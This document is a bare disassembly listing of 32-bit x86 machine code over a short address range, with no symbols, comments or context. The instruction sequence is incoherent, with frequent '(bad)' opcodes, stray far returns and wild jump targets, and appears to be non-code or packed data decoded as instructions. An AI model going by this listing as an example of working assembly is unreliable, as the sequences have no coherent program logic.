  412b20:	mov    ebp,ecx
  412b22:	rol    BYTE PTR [eax],1
  412b24:	inc    ebp
  412b25:	add    BYTE PTR [eax-0x7747ab3],bh
  412b2b:	clc    
  412b2c:	inc    ebp
  412b2d:	retf   
  412b2e:	mov    edx,ebx
  412b30:	in     al,dx
  412b31:	(bad)  
  412b32:	retf   
  412b33:	into   
  412b34:	into   
  412b35:	scas   eax,DWORD PTR es:[edi]
  412b36:	dec    ebp
  412b37:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  412b3d:	sub    ecx,esi
  412b3f:	cmp    ecx,DWORD PTR [ebp+0x77]
  412b42:	(bad)  
  412b43:	mov    edi,eax
  412b45:	int3   
  412b46:	test   DWORD PTR [ecx-0x74baff08],ecx
  412b4c:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  412b53:	xor    eax,DWORD PTR [ebp+0x4503f803]
  412b59:	(bad)  
  412b5b:	retf   0x559c
  412b5e:	(bad)  
  412b5f:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  412b66:	inc    ebp
  412b67:	add    eax,0xeb9c4d3f
  412b6c:	(bad)  
  412b6d:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  412b73:	xor    ecx,DWORD PTR [ebp+0x33]
  412b76:	mov    eax,DWORD PTR [ebx]
  412b78:	call   0xce50f680
  412b7d:	retf   0x55d1
  412b80:	test   BYTE PTR [ebx-0x5ff17fe],cl
  412b86:	jmp    0x412b81
  412b88:	add    BYTE PTR ds:0xebf44d8b,al
  412b8e:	push   ebp
  412b8f:	mov    ebp,DWORD PTR [ebx]
  412b91:	mov    eax,0x33f8558b
  412b96:	retf   
  412b97:	xor    ecx,esi
  412b99:	add    edx,ecx
  412b9b:	add    eax,DWORD PTR [edx+0xca010f]
  412ba1:	push   ebp
  412ba2:	dec    ebp
  412ba3:	mov    ecx,DWORD PTR [ebx-0x34050718]
  412ba9:	stc    
  412baa:	rol    DWORD PTR ds:0xebce4dd6,cl
  412bb0:	scas   eax,DWORD PTR es:[edi]
  412bb1:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  412bb7:	xor    ebp,DWORD PTR [ebx]
  412bb9:	xor    edi,DWORD PTR [ebx]
  412bbb:	add    esi,DWORD PTR [edi+0x3]
  412bbe:	mov    ecx,DWORD PTR [edi]
  412bc0:	clc    
  412bc1:	retf   0x55cb
  412bc4:	into   
  412bc5:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  412bcc:	test   al,0x4d
  412bce:	push   ebp
  412bcf:	jbe    0x412c04
  412bd1:	mov    esi,DWORD PTR [ebx]
  412bd3:	mov    al,0x3
  412bd5:	push   ebp
  412bd6:	add    esi,DWORD PTR [ebx]
  412bd8:	rdpmc  
  412bda:	retf   0x5503
  412bdd:	add    ecx,DWORD PTR [ebx-0x53517f1]
  412be3:	dec    ebp
  412be4:	stc    
  412be5:	mov    ecx,DWORD PTR [eax]
  412be7:	or     BYTE PTR [ebp+0x4d],cl
  412bea:	jmp    0x1352c7a
  412bef:	dec    ebp
  412bf0:	dec    ebp
  412bf1:	(bad)  
  412bf2:	mov    ebx,esp
  412bf4:	clc    
  412bf5:	test   ebx,ecx
  412bf7:	clc    
  412bf8:	ror    DWORD PTR [ebp-0x2a],cl
  412bfb:	mov    esi,ecx
  412bfd:	lock scas eax,DWORD PTR es:[edi]
  412bff:	inc    ebp
  412c00:	mov    esi,DWORD PTR [ebx]
  412c02:	hlt    
  412c03:	pushf  
  412c04:	jge    0x412b91
  412c06:	sub    ebx,esp
  412c08:	cmp    ecx,ebx
  412c0a:	ja     0x412bda
  412c0c:	mov    ebp,DWORD PTR [eax-0x58]
  412c0f:	dec    ebp
  412c10:	xor    ecx,DWORD PTR [di+0x3]
  412c14:	mov    esp,esp
  412c16:	clc    
  412c17:	push   ebp
  412c18:	retf   
  412c19:	mov    dl,bl
  412c1b:	adc    esi,edx
  412c1d:	jb     0x412bed
  412c1f:	add    BYTE PTR [edi-0xb7474b3],ch
  412c25:	lock jge 0x412bf3
  412c28:	sub    ecx,DWORD PTR [ebp+0x3b]
  412c2b:	mov    esi,DWORD PTR [edi-0x20]
  412c2e:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  412c35:	mov    BYTE PTR [ebx-0x34b20729],cl
  412c3b:	mov    edx,ebx
  412c3d:	lock (bad) 
  412c3f:	ror    esi,cl
  412c41:	push   ebp
  412c42:	scas   eax,DWORD PTR es:[edi]
  412c43:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  412c49:	pushf  
  412c4a:	sub    esi,DWORD PTR [edx]
  412c4c:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  412c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c53:	xor    esp,DWORD PTR [ebx]
  412c55:	add    ecx,DWORD PTR [ebp-0x1c]
  412c58:	mov    edi,DWORD PTR [ebp-0x8]
  412c5b:	mov    bl,cl
  412c5d:	cmp    dl,bl
  412c5f:	jb     0x412c2f
  412c61:	add    dh,dl
  412c63:	dec    ebp
  412c64:	scas   eax,DWORD PTR es:[edi]
  412c65:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  412c6b:	shr    DWORD PTR [ebx],cl
  412c6d:	into   
  412c6e:	cmp    edx,esi
  412c70:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  412c76:	dec    ebp
  412c77:	dec    ebp
  412c78:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  412c7e:	retf   
  412c7f:	xor    edx,esi
  412c81:	add    ecx,esi
  412c83:	imul   ecx,edx
  412c86:	mov    DWORD PTR [ebp+0x8],edx
  412c89:	xor    ecx,DWORD PTR [ebp+0x2b]
  412c8c:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  412c92:	add    esi,DWORD PTR [ebx]
  412c94:	rol    BYTE PTR [ebx],0x45
  412c97:	rdtsc  
  412c99:	xlat   BYTE PTR ds:[ebx]
  412c9a:	pushf  
  412c9b:	jge    0x412c26
  412c9d:	xor    esp,eax
  412c9f:	sub    eax,DWORD PTR [ebp-0x73]
  412ca2:	(bad)  
  412ca3:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  412caa:	dec    ebp
  412cab:	xchg   BYTE PTR [ebx],dh
  412cad:	inc    DWORD PTR [ebx]
  412caf:	(bad)  
  412cb0:	jmp    0x412cff
  412cb2:	mov    ecx,DWORD PTR [ebx-0x34341324]
  412cb8:	dec    ebp
  412cb9:	into   
  412cba:	mov    ebp,DWORD PTR [edi-0x23737420]
  412cc0:	pushf  
  412cc1:	shl    DWORD PTR [edx],cl
  412cc3:	retf   0x5588
  412cc6:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412ccc:	add    eax,DWORD PTR [eax]
  412cce:	in     al,0x4d
  412cd0:	push   ebp
  412cd1:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  412cd7:	fs add ch,cl
  412cda:	dec    ebp
  412cdb:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  412ce1:	dec    ebp
  412ce2:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  412ce8:	jge    0x412cb8
  412cea:	mov    BYTE PTR [edi+0xf723b3a],ch
  412cf0:	add    cl,dh
  412cf2:	dec    ebp
  412cf3:	dec    DWORD PTR [ebx-0x2c032301]
  412cf9:	inc    ebp
  412cfa:	push   ebp
  412cfb:	dec    DWORD PTR [ebx-0x73ff1f34]
  412d01:	lea    ebx,[esp+edx*2+0x508bff32]
  412d08:	mov    ah,0x45
  412d0a:	push   ebp
  412d0b:	mov    esi,DWORD PTR [ebx]
  412d0d:	les    esi,FWORD PTR [ebx]
  412d0f:	add    BYTE PTR [ebx],al
  412d11:	inc    DWORD PTR [ebx]
  412d13:	mov    ecx,DWORD PTR [edi]
  412d15:	cld    
  412d16:	retf   0x4d80
  412d19:	add    DWORD PTR [ecx+0x4d30e400],ecx
  412d1f:	jne    0x412cac
  412d21:	(bad)  
  412d22:	in     al,dx
  412d23:	ror    bl,1
  412d25:	scas   al,BYTE PTR es:[edi]
  412d26:	into   
  412d27:	add    BYTE PTR [edi-0xf2f7475],ch
  412d2d:	not    bl
  412d2f:	adc    al,0xca
  412d31:	inc    ebp
  412d32:	push   ebp
  412d33:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  412d39:	push   0xaf80d6
  412d3e:	mov    eax,DWORD PTR [eax]
  412d40:	fdiv   st(7),st
  412d42:	sti    
  412d43:	sbb    dh,cl
  412d45:	pop    esi
  412d46:	xchg   esp,eax
  412d47:	leave  
  412d48:	pushf  
  412d49:	add    al,0x32
  412d4b:	push   ebp
  412d4c:	cmp    ebp,esp
  412d4e:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  412d52:	dec    DWORD PTR [ecx-0x740f0375]
  412d58:	push   ebp
  412d59:	cld    
  412d5a:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  412d60:	retf   0x558b
  412d63:	clc    
  412d64:	xor    esi,eax
  412d66:	add    esi,DWORD PTR [ebp-0x75]
  412d69:	(bad)  
  412d6a:	hlt    
  412d6b:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  412d72:	mov    DWORD PTR [edx],ecx
  412d74:	hlt    
  412d75:	(bad)  
  412d76:	dec    ebp
  412d77:	add    dh,BYTE PTR [ebx]
  412d79:	leave  
  412d7a:	mov    edx,0xffec8d55
  412d7f:	push   ecx
  412d80:	rol    DWORD PTR [ebp+0x55],1
  412d83:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  412d89:	mov    eax,0xf8030b33
  412d8e:	lar    ecx,di
  412d91:	push   ebp
  412d92:	retf   0x863b
  412d95:	jne    0x412d94
  412d97:	mov    edi,edi
  412d99:	or     BYTE PTR [ebp+0x41],dh
  412d9c:	mov    ebp,esp
  412d9e:	cld    
  412d9f:	inc    eax
  412da0:	mov    al,0x25
  412da2:	add    DWORD PTR [ecx+0x0],eax
  412da5:	in     eax,dx
  412da6:	test   DWORD PTR [ecx-0x1],eax
  412da9:	fdiv   st(7),st
  412dab:	ret    0x8b
  412dae:	cld    
  412daf:	mov    eax,DWORD PTR [eax+0x8d0151]
  412db5:	clc    
  412db6:	xor    BYTE PTR [ebp+0x45],al
  412db9:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  412dbf:	loopne 0x412dc0
  412dc1:	mov    edi,edi
  412dc3:	mov    ecx,eax
  412dc5:	clc    
  412dc6:	jne    0x412d98
  412dc8:	call   0x823ed1
  412dcd:	and    eax,0xc6854575
  412dd2:	je     0x412dd5
  412dd4:	mov    eax,esi
  412dd6:	cld    
  412dd7:	or     DWORD PTR [eax+0x401c9],eax
  412ddd:	push   ebp
  412dde:	add    ah,ch
  412de0:	add    BYTE PTR [ecx+0x6a],dl
  412de3:	inc    ebp
  412de4:	push   esi
  412de5:	mov    DWORD PTR [eax-0x4],edx
  412de8:	pop    edi
  412de9:	mov    ebx,DWORD PTR [ebx-0x4]
  412dec:	ret    0xbe
  412def:	push   es
  412df0:	mov    ecx,DWORD PTR [ecx-0x77274af]
  412df6:	clc    
  412df7:	lock inc ebp
  412df9:	jne    0x412e51
  412dfb:	(bad)  
  412dfc:	jne    0x412e02
  412dfe:	mov    eax,0xf841ba66
  412e03:	fadd   QWORD PTR [esi]
  412e05:	(bad)  
  412e06:	jne    0x412e45
  412e08:	cmp    eax,ebx
  412e0a:	pop    esi
  412e0b:	mov    ecx,DWORD PTR [eax]
  412e0d:	push   ecx
  412e0e:	inc    ecx
  412e0f:	lea    esi,[eax-0x8]
  412e12:	inc    edx
  412e13:	inc    ebp
  412e14:	int    0x8b
  412e16:	inc    edx
  412e17:	cld    
  412e18:	jo     0x412dd9
  412e1a:	inc    ecx
  412e1b:	xchg   edx,esp
  412e1d:	mov    ebx,eax
  412e1f:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  412e25:	or     edi,eax
  412e27:	inc    ebp
  412e28:	inc    ebp
  412e29:	(bad)  
  412e2a:	mov    ecx,DWORD PTR [eax]
  412e2c:	cld    
  412e2d:	(bad)  
  412e2e:	jmp    0x412e31
  412e30:	mov    eax,esi
  412e32:	mov    DWORD PTR ds:0x4f8c98b,eax
  412e38:	rcl    BYTE PTR [esi+0xf],1
  412e3b:	iret   
  412e3c:	inc    ebp
  412e3d:	leave  
  412e3e:	(bad)  
  412e3f:	dec    DWORD PTR [ecx]
  412e41:	mov    eax,esi
  412e43:	mov    eax,DWORD PTR [edi]
  412e45:	mov    dh,0xdd
  412e48:	push   es
  412e49:	nop
  412e4a:	(bad)  
  412e4b:	inc    DWORD PTR [ebx]
  412e4d:	push   esi
  412e4e:	leave  
  412e4f:	iret   
  412e50:	add    al,0x46
  412e52:	push   ebp
  412e53:	jmp    0xff928444
  412e58:	inc    ebp
  412e59:	push   esi
  412e5a:	mov    DWORD PTR [esi-0x4],eax
  412e5d:	in     eax,dx
  412e5e:	push   ebp
  412e5f:	sbb    BYTE PTR [eax+0x7c6daff],bh
  412e65:	add    al,BYTE PTR [edx]
  412e67:	mov    edx,DWORD PTR [ebp-0x17]
  412e6a:	cmp    edi,esi
  412e6c:	jne    0x412e6d
  412e6e:	(bad)  
  412e6f:	push   esi
  412e70:	pop    es
  412e71:	push   ebp
  412e72:	mov    ebp,esp
  412e74:	or     BYTE PTR [ebp+0x41],al
  412e77:	add    edi,esp
  412e79:	sub    BYTE PTR [eax-0x4],al
  412e7c:	int3   
  412e7d:	jne    0x412e41
  412e7f:	add    DWORD PTR [eax],eax
  412e81:	sbb    al,0x8b
  412e83:	mov    edx,DWORD PTR [ecx+0x14]
  412e86:	lea    edx,[edx-0x1ba7508]
  412e8c:	push   esi
  412e8d:	enter  0xd375,0xb8
  412e91:	test   DWORD PTR [esi],0x6ce0750
  412e97:	enter  0xd375,0x3b
  412e9b:	neg    DWORD PTR [esi+0x50]
  412e9e:	or     cl,dl
  412ea0:	inc    edx
  412ea1:	(bad)  
  412ea2:	loope  0x412e90
  412ea4:	(bad)  
  412ea5:	sub    eax,DWORD PTR [ebx]
  412ea7:	inc    eax
  412ea8:	loope  0x412efa
  412eaa:	add    dl,BYTE PTR [eax-0x37]
  412ead:	push   edi
  412eae:	push   ebp
  412eaf:	imul   ah
  412eb1:	adc    DWORD PTR [ecx-0x1],0x45
  412eb5:	add    BYTE PTR [ecx+0x55d3fc00],cl
  412ebb:	lea    edi,[eax-0x7fff4ca]
  412ec1:	mov    eax,0x4550402
  412ec6:	cmp    ebp,ecx
  412ec8:	jne    0x412e75
  412eca:	mov    eax,DWORD PTR ds:0x241e808
  412ed0:	in     eax,dx
  412ed1:	add    BYTE PTR [eax-0x7],al
  412ed4:	out    0x36,eax
  412ed6:	inc    ecx
  412ed7:	aas    
  412ed8:	jmp    0xccf15a
  412edd:	lock mov edi,DWORD PTR [ebp-0x18]
  412ee1:	and    edi,edi
  412ee3:	mov    edi,edi
  412ee5:	call   0xe40f2fc1
  412eea:	push   es
  412eeb:	add    al,ch
  412eed:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  412ef4:	(bad)  
  412ef5:	hlt    
  412ef6:	add    eax,0xffd3e87d
  412efb:	cmp    bh,0x8
  412efe:	(bad)  
  412eff:	fld    DWORD PTR [esi]
  412f01:	out    dx,al
  412f02:	call   0xffa02e0a
  412f07:	cmp    al,0x46
  412f09:	shl    edx,0x8
  412f0c:	(bad)  
  412f0d:	pop    es
  412f0e:	fisttp QWORD PTR [ebp+0xe577eff]
  412f14:	push   ebx
  412f15:	add    BYTE PTR [ebx+0x24008b56],cl
  412f1b:	add    BYTE PTR [ebp+0x50],al
  412f1e:	push   eax
  412f1f:	add    DWORD PTR [ebx+0x757d1834],ecx
  412f25:	sub    edx,DWORD PTR [esi-0x24]
  412f28:	jne    0x412ee0
  412f2a:	lods   eax,DWORD PTR ds:[esi]
  412f2b:	mov    edx,DWORD PTR [edx-0x34]
  412f2e:	dec    esi
  412f2f:	out    0x83,eax
  412f31:	into   
  412f32:	push   edi
  412f34:	loopne 0x412f04
  412f36:	shr    BYTE PTR [edx+ecx*4+0x0],1
  412f3a:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  412f41:	rol    DWORD PTR [edx],0x8
  412f44:	mov    esp,ecx
  412f46:	cmp    DWORD PTR [ebx],0xc
  412f49:	mov    esi,0x5001c0
  412f4e:	push   eax
  412f4f:	push   cs
  412f50:	push   eax
  412f51:	(bad)  
  412f52:	sub    edx,edi
  412f54:	push   esi
  412f55:	adc    al,0xcb
  412f57:	ins    DWORD PTR es:[edi],dx
  412f58:	mov    eax,0x203e8
  412f5d:	add    al,ah
  412f5f:	inc    esi
  412f60:	mov    al,ch
  412f62:	pop    es
  412f63:	add    DWORD PTR [eax],0x1
  412f66:	add    dh,al
  412f68:	add    ah,ch
  412f6a:	rol    DWORD PTR [edx-0xd],1
  412f6d:	cli    
  412f6e:	push   0x4a
  412f70:	pop    ecx
  412f71:	retf   0xfe6
  412f74:	add    BYTE PTR [ebx-0x4e72f41e],al
  412f7a:	(bad)  
  412f7b:	dec    BYTE PTR [ebx+0x45b1fc72]
  412f81:	(bad)  
  412f82:	sub    ebp,DWORD PTR [ebx]
  412f84:	and    al,0x52
  412f86:	(bad)  
  412f87:	dec    edi
  412f88:	inc    ebp
  412f89:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  412f90:	add    BYTE PTR [ebp-0x7b],dh
  412f93:	pop    eax
  412f94:	add    BYTE PTR [edx+0x0],bl
  412f97:	pop    edx
  412f98:	dec    ebp
  412f99:	jmp    DWORD PTR [ebx]
  412f9b:	and    al,0xec
  412f9d:	push   edx
  412f9e:	out    0x64,eax
  412fa0:	jmp    0xd3f325a5
  412fa5:	jmp    0x412fff
  412fa7:	mov    al,0xfe
  412fa9:	dec    BYTE PTR [ebp-0x18fd8018]
  412faf:	add    BYTE PTR [esi+ebp*1],bh
  412fb2:	pop    edx
  412fb3:	icebp  
  412fb4:	mov    eax,cs
  412fb6:	ins    BYTE PTR es:[edi],dx
  412fb7:	adc    eax,0x75510000
  412fbc:	mov    esi,0x70158
  412fc1:	or     DWORD PTR [eax-0x74f48dfe],esi
  412fc7:	mov    edi,esp
  412fc9:	cld    
  412fca:	jge    0x413041
  412fcc:	(bad)  
  412fce:	aas    
  412fcf:	and    al,0x6d
  412fd1:	adc    cl,0x1
  412fd4:	mov    eax,DWORD PTR [eax]
  412fd6:	and    ecx,DWORD PTR [ebx-0x167203fd]
  412fdc:	dec    ebp
  412fdd:	add    eax,ebp
  412fdf:	add    BYTE PTR [edx],al
  412fe1:	fadd   DWORD PTR [eax]
  412fe3:	stc    
  412fe4:	enter  0xee00,0x8b
  412fe8:	sbb    eax,0x1
  412feb:	sbb    esi,ecx
  412fed:	in     al,0x0
  412fef:	in     eax,dx
  412ff0:	add    BYTE PTR [eax],al
  412ff2:	jne    0x412f7f
  412ff4:	cmp    edx,esp
  412ff6:	jb     0x413001
  412ff8:	jmp    0x41306f
  412ffa:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  413000:	add    BYTE PTR [ebx+0x4d83d840],cl
  413006:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  41300c:	jb     0x412f97
  41300e:	pop    edx
  41300f:	fadd   QWORD PTR [ebx-0x7445faa1]
  413015:	or     dh,BYTE PTR [edx+0x0]
  413018:	inc    edx
  413019:	or     dl,bh
  41301b:	xlat   BYTE PTR ds:[ebx]
  41301c:	dec    edx
  41301d:	push   edi
  41301e:	add    al,0x7
  413020:	leave  
  413021:	rol    DWORD PTR [edx+eax*1],0x7
  413025:	add    ecx,ecx
  413027:	mov    edx,ecx
  413029:	int3   
  41302a:	jmp    0x412fea
  41302c:	mov    al,0x0
  41302e:	(bad)  
  41302f:	jne    0x413019
  413031:	mov    eax,DWORD PTR [edx]
  413033:	call   0xc155ad38
  413038:	pop    edi
  413039:	add    ebx,DWORD PTR [ecx-0x37]
  41303c:	pop    ecx
  41303d:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  413044:	push   es
  413045:	mov    eax,DWORD PTR [eax]
  413047:	int3   
  413048:	add    ch,al
  41304a:	jae    0x413034
  41304c:	int    0x1
  41304e:	enter  0x3000,0x18
  413052:	add    BYTE PTR [ebp+0x75],al
  413055:	mov    esi,DWORD PTR [eax-0x171f0134]
  41305b:	push   0x2
  41305d:	pop    ecx
  41305e:	add    BYTE PTR [eax],cl
  413060:	push   ebx
  413061:	lea    edi,[edi+eax*2]
  413064:	mov    al,0x1
  413066:	jb     0x413068
  413068:	mov    al,0x10
  41306a:	push   eax
  41306b:	add    al,0x75
  41306d:	add    BYTE PTR [ebx],ch
  41306f:	add    ebx,esp
  413071:	int3   
  413072:	jne    0x413084
  413074:	movsx  edx,cl
  413077:	add    DWORD PTR [eax],eax
  413079:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  413080:	mov    gs,edi
  413082:	add    BYTE PTR [eax-0x50],ch
  413085:	add    al,ch
  413087:	mov    eax,DWORD PTR [ecx]
  413089:	sub    eax,DWORD PTR [eax]
  41308b:	jb     0x413102
  41308d:	add    DWORD PTR [esp+eiz*8-0x50],esi
  413091:	jge    0x41307b
  413093:	add    al,0x1
  413095:	add    DWORD PTR [eax],0x0
  413098:	jne    0x41309a
  41309a:	je     0x4130e1
  41309c:	mov    eax,DWORD PTR [edi]
  41309e:	ror    BYTE PTR [ebp+0x4d],1
  4130a1:	or     DWORD PTR [ecx+0x4d03d004],0x3
  4130a8:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  4130ae:	mov    DWORD PTR [ebx],ebp
  4130b0:	fadd   DWORD PTR [eax+0x75]
  4130b3:	inc    eax
  4130b4:	pop    eax
  4130b5:	lea    ebx,[ecx+0x4f]
  4130b8:	push   0xb1000003
  4130bd:	out    dx,eax
  4130be:	add    ebp,DWORD PTR [edx+edx*2]
  4130c1:	add    BYTE PTR [ebx+ecx*4],bh
  4130c4:	mov    ch,BYTE PTR [ebx]
  4130c6:	jb     0x41313a
  4130c8:	add    al,0x89
  4130ca:	push   eax
  4130cb:	call   0x84297e3d
  4130d0:	add    DWORD PTR [eax+eax*1],eax
  4130d3:	jae    0x4130e9
  4130d5:	icebp  
  4130d6:	inc    ebp
  4130d7:	mov    eax,DWORD PTR gs:[ecx]
  4130da:	int3   
  4130db:	out    dx,al
  4130dc:	loopne 0x41312b
  4130de:	sub    eax,DWORD PTR [edx]
  4130e0:	push   0xffffff83
  4130e2:	pop    esi
  4130e3:	push   cs
  4130e4:	jl     0x4130ff
  4130e6:	add    al,0xaf
  4130e8:	xor    eax,0x832b6d00
  4130ed:	mov    eax,DWORD PTR [edx]
  4130ef:	rcr    BYTE PTR [ebp+0x754500dc],cl
  4130f5:	ror    DWORD PTR [ebx+0x7dc8e803],1
  4130fb:	inc    ebp
  4130fc:	shr    ebx,0x3
  4130ff:	or     DWORD PTR [eax],0x4
  413102:	push   0xffffffa5
  413104:	pop    esi
  413105:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  41310c:	jmp    0x41316b
  41310e:	mov    edi,0xff0272
  413113:	fdivr  QWORD PTR [ebp+0x5d]
  413116:	push   0x4e
  413118:	pop    ecx
  413119:	call   0x41751e
  41311e:	mov    DWORD PTR [ebx],eax
  413120:	in     al,0xc8
  413122:	rol    BYTE PTR [ebp-0x75],0xc1
  413126:	call   0xab3307
  41312b:	pop    esi
  41312c:	enter  0xceff,0x8b
  413130:	repz mov ecx,DWORD PTR [ebp-0x34]
  413134:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  41313b:	je     0x41313d
  41313d:	or     DWORD PTR [ebx-0x74183b24],eax
  413143:	jne    0x413129
  413145:	jmp    0x413140
  413147:	push   DWORD PTR [edx-0x24]
  41314a:	push   0x4d
  41314c:	pop    ecx
  41314d:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  413151:	jge    0x413159
  413153:	mov    eax,eax
  413155:	sub    ebp,DWORD PTR [edx+0x24]
  413158:	pop    esi
  413159:	inc    ebp
  41315a:	mov    esp,0x8b6077
  41315f:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  413165:	lods   al,BYTE PTR ds:[esi]
  413166:	add    BYTE PTR [ebx],bh
  413168:	enter  0xce73,0x49
  41316c:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  413174:	stc    
  413175:	jge    0x4131e9
  413177:	jnp    0xdd40b4d8
  41317d:	call   0xc43253
  413182:	fadd   st(0),st
  413184:	dec    esi
  413185:	ins    BYTE PTR es:[edi],dx
  413186:	stc    
  413187:	cmp    al,0x73
  413189:	push   ebp
  41318a:	mov    eax,0xf8028b
  41318f:	jne    0x413152
  413191:	mov    esi,ecx
  413193:	mov    esp,DWORD PTR [ebp+0x2c]
  413196:	add    edi,DWORD PTR [ebp-0x24]
  413199:	sub    esp,eax
  41319b:	and    al,0x45
  41319d:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4131a3:	sbb    al,0xee
  4131a5:	pop    esi
  4131a6:	call   0x8131d6
  4131ab:	fsubr  st,st(3)
  4131ad:	sti    
  4131ae:	add    BYTE PTR gs:[ecx],bh
  4131b1:	add    eax,esp
  4131b3:	add    DWORD PTR [esi],eax
  4131b5:	rol    DWORD PTR [ebp+0x8],0x29
  4131b9:	mov    esp,eax
  4131bb:	clc    
  4131bc:	jne    0x413233
  4131be:	mov    eax,0x8b0673
  4131c3:	loopne 0x41320a
  4131c5:	loopne 0x413150
  4131c7:	lods   al,BYTE PTR ds:[esi]
  4131c8:	int3   
  4131c9:	inc    ebp
  4131ca:	mov    DWORD PTR gs:[eax+edi*8],eax
  4131ce:	add    al,0xc3
  4131d0:	sub    ecx,DWORD PTR [ebp+0x47]
  4131d3:	(bad)  
  4131d5:	shr    BYTE PTR [ebp-0x1f],0xe8
  4131d9:	add    eax,DWORD PTR [eax]
  4131db:	call   0x642f2e0
  4131e0:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4131e6:	dec    esi
  4131e7:	ins    DWORD PTR es:[edi],dx
  4131e8:	in     al,dx
  4131e9:	lea    eax,[eax]
  4131eb:	inc    ebp
  4131ec:	inc    ebp
  4131ed:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4131f3:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4131fd:	and    al,0xdc
  4131ff:	ror    DWORD PTR [edx+0x24],0xf7
  413203:	or     BYTE PTR [ebp+0x4c],dh
  413206:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  41320a:	stos   BYTE PTR es:[edi],al
  41320b:	adc    edx,edi
  41320d:	inc    esp
  41320e:	add    edi,DWORD PTR [eax]
  413210:	jne    0x4131f5
  413212:	mov    DWORD PTR [eax-0x7449db04],ecx
  413218:	cmp    ecx,DWORD PTR [edi]
  41321a:	sub    BYTE PTR [ebp-0x7e],dl
  41321d:	sar    ebp,0xb
  413220:	jmp    FWORD PTR [edi+0x2400392a]
  413226:	sub    esi,DWORD PTR [ebx-0x73]
  413229:	mov    esp,DWORD PTR [ecx+edi*4]
  41322c:	mov    ecx,DWORD PTR [eax]
  41322e:	and    BYTE PTR [eax],al
  413230:	jne    0x4131fc
  413232:	sub    ebp,ecx
  413234:	sbb    BYTE PTR [esi+0x32],ah
  413237:	dec    ebp
  413238:	push   ebp
  413239:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41323f:	ret    
  413240:	mov    edx,ebp
  413242:	leave  
  413243:	sub    DWORD PTR [esi+0x24],ebx
  413246:	ret    0x2b
  413249:	pop    ax
  41324b:	push   ebp
  41324c:	rol    BYTE PTR [ebx],0xeb
  41324f:	add    DWORD PTR [ecx+0x6c0001],0x40
  413256:	jb     0x4132ad
  413258:	ret    
  413259:	in     al,dx
  41325a:	jecxz  0x4131e7
  41325c:	push   esi
  41325d:	xchg   esp,eax
  41325e:	jne    0x413260
  413260:	cmp    edx,DWORD PTR [esi+0x1c]
  413263:	jne    0x413249
  413265:	mov    eax,DWORD PTR [ebp-0x77]
  413268:	ror    DWORD PTR [ebx+0x899408],0xe0
  41326f:	mov    esi,DWORD PTR [ebp-0x75]
  413272:	pop    esi
  413273:	nop
  413274:	mov    eax,DWORD PTR [eax]
  413276:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  41327c:	add    al,0x0
  41327e:	inc    ebp
  41327f:	mov    eax,DWORD PTR [ebx]
  413281:	mov    ebp,ebx
  413283:	cmp    al,0xf
  413285:	or     al,al
  413287:	inc    ebp
  413288:	inc    ebp
  413289:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41328f:	cld    
  413290:	add    BYTE PTR [edi+0x556c16c0],dh
  413296:	add    BYTE PTR [ecx-0x5],dl
  413299:	add    eax,0x17200
  41329e:	sbb    al,0x85
  4132a0:	dec    esp
  4132a1:	je     0x4132db
  4132a3:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4132a7:	add    BYTE PTR [ebx],bh
  4132a9:	(bad)  
  4132aa:	and    al,0x30
  4132ac:	jae    0x41324a
  4132ae:	mov    cl,cl
  4132b0:	inc    DWORD PTR [esp]
  4132b3:	push   ebp
  4132b4:	shr    esp,0x8
  4132b7:	in     al,dx
  4132b8:	push   esp
  4132b9:	add    DWORD PTR [eax],esp
  4132bb:	add    bl,cl
  4132bd:	inc    ebp
  4132be:	mov    bh,0x53
  4132c0:	add    BYTE PTR [ebp-0x17],al
  4132c3:	push   esi
  4132c4:	cmovne ecx,edx
  4132c7:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4132cb:	push   edi
  4132cc:	pop    ss
  4132cd:	xor    ecx,ebx
  4132cf:	pushf  
